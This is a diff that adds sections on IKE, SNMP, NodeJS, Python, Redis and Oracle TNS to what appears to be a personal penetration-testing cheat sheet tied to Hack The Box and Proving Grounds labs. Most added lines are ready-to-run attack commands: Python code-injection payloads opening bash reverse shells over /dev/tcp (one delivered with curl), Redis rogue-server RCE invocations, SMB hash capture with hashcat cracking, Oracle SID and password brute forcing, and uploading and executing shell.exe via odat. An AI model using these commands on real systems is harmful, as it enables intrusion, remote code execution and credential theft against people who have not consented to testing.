@@ -134,6 +134,12 @@ I try as much as possible to link to the various sources or inspiration for thes
   - [Windows Library Files](#windows-library-files)
 - [Server-side Attacks](#server-side-attacks)
   - [NFS](#nfs)
+  - [IKE - Internet Key Exchange](##ike---internet-key-exchange)
+  - [SNMP](#snmp)
+  - [NodeJS](#nodejs)
+  - [Python](#python)
+  - [Redis 6379](#redis-6379)
+  - [Oracle TNS](#oracle-tns)
 - [Thick client vulnerabilities](#thick-client-vulnerabilities)
   - [DLL Hijacking](#dll-hijacking)
   - [Insecure application design](#insecure-application-design)
@@ -3653,7 +3659,7 @@ Library files consist of three major parts written in XML to specify the paramet
 
 ## Server-Side attacks
 
-#### <ins>NFS</ins>
+### <ins>NFS</ins>
 
 - > "Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user."
 - Ports: 2049, 111
@@ -3688,6 +3694,106 @@ Library files consist of three major parts written in XML to specify the paramet
   ```
   - modify `/etc/hosts` with `echo "192.168.45.195 localhost" >> /etc/hosts`
 - Check: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
+
+
+### <ins>IKE - Internet Key Exchange</ins>
+
+- common port: `500/udp-tcp`
+  - nmap sometimes says `isakmp?`
+- Initial scan
+  - `ike-scan IP`
+- see also SNMP
+  - port `161/udp-tcp`
+
+
+### <ins>SNMP</ins>
+
+- if you see this, maybe with IKE, can mean that this service is used to block any interaction from external hosts
+  - if you can configure it, you can bypass this kind of proxy and rerun nmap
+- common port: `161/udp-tcp`
+- `snmpwalk -v2c -c public IP`
+  - you might find a md5 or ntlm password
+If you have found a password
+1. `echo 'IP : PSK "PASSWORD1234"' >> /etc/ipsec.secrets`
+2. `sudo gedit /etc/ipsec.conf`
+3. `sudo ipsec stop`
+4. `sudo ipsec start --nofork`
+- See Hack The Box / Conceal
+- When you run again nmap, use `-sT`
+
+
+### <ins>NodeJS</ins>
+
+- Reverse shell: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs
+- If you find JS injection, you find RCE. Try this payload: `(function(){return 2+2;})();`
+  - if the result is `4`, then it is a good sign
+
+
+### <ins>Python</ins>
+
+- https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1
+- check if there is the library 'os', you can achieve RCE with `system('bash -i >& /dev/tcp/192.168.45.221/445 0>&1')`
+- alternatives
+  - `__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')#`
+  - `curl -X POST --data-urlencode 'code=__import__("os").system("bash -i >& /dev/tcp/192.168.49.195/445 0>&1")#' http://192.168.195.117:50000/verify`
+  - `code=__import__('os').system('bash+-i+>%26+/dev/tcp/192.168.49.195/445+0>%261')%2`
+
+
+### <ins>Redis 6379</ins>
+
+- `nmap --script redis-info -sV -p 6379 IP`
+- `redis-cli -h IP`
+  - try command `info`
+  - if no login, run the command: `config get *`
+- To dump the db: `redis-utils` and `redis-dump`
+- Deafult config file: `/etc/redis/redis.conf`
+
+**SSRF**
+- eval "dofile('//myip/share')" 0
+  - run also with `sudo impacket-smbserver -smb2support share /home/kali/Downloads/`
+  - `hashcat -m 5600 -a 0 user.hash /usr/share/wordlists/rockyou.txt`
+
+**Possible RCEs, see with searchsploit**
+- [Redis Rogue Server](https://github.com/n0b0dyCN/redis-rogue-server)
+  - if you don't need user:password, `python3 redis-rogue-server.py --rhost RHOST --lhost LHOST`
+- [RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)
+- other RCE (combine the two commands):
+  - python redis-rce.py -r 192.168.220.166 -L 192.168.45.181 -f exp.so -a 'Ready4Redis?'
+  - python3 redis-rogue-server.py --rhost 192.168.220.166 --rport 80 --lhost 192.168.45.181 --lport 7080 --exp=exp.so -v --passwd='Ready4Redis?'
+
+**Resources**
+- [6379 - Pentesting Redis | HackTricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)
+- [4 :6379 redis Writeup](https://kashz.gitbook.io/proving-grounds-writeups/pg-boxes/sybaris/4-6379-redis)
+- [Readys Write Up — Proving Grounds](https://medium.com/@C4berowl/readys-write-up-proving-grounds-e066074eed)
+
+
+
+### <ins>Oracle TNS</ins>
+
+- HackTricks: https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener
+- Common ports: `1521`, `1748`
+- TNS poison: `python3 odat.py tnspoison -s <IP> -p <PORT> -d <SID> --test-module`
+
+1. Enumeration - version
+- `nmap --script "oracle-tns-version" -p 1521 -T4 -sV IP`
+- `tnscmd10g COMMAND -p 1521 -h IP`
+  - commands: `ping`, `version`, `status`, `services`, `debug`, `reload`, `save_config`, `stop`
+  - if it gives you an error, try '--10G'
+  - See description of errors here: https://docs.oracle.com/database/121/ERRMG/TNS-00000.htm
+
+2. Enumerate SID
+- `hydra -L '/home/kali/Documents/lists/oracle-tns/sids-oracle.txt' -s 1521 IP oracle-sid`
+- `python3 odat.py sidguesser -s IP -p 1521`
+
+3. Password guess
+- `python3 odat.py passwordguesser -s IP -p 1521 -d XE --accounts-file accounts/accounts_large.txt`
+- `nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n IP`
+
+4. Upload arbitrary files
+- `python3 odat.py utlfile -s IP -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ shell.exe shell.exe`
+
+5. Execute files
+- `python3 odat.py externaltable -s IP -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ shell.exe`
 
 
 ## Thick client vulnerabilities
